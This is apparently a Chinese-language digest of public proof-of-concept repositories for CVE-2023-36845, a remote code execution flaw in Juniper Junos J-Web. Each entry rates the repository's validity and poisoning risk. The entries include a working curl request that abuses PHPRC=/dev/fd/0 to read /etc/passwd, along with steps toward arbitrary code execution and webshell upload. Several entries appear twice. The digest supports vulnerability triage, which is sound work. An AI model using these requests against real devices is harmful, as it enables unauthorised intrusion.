**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
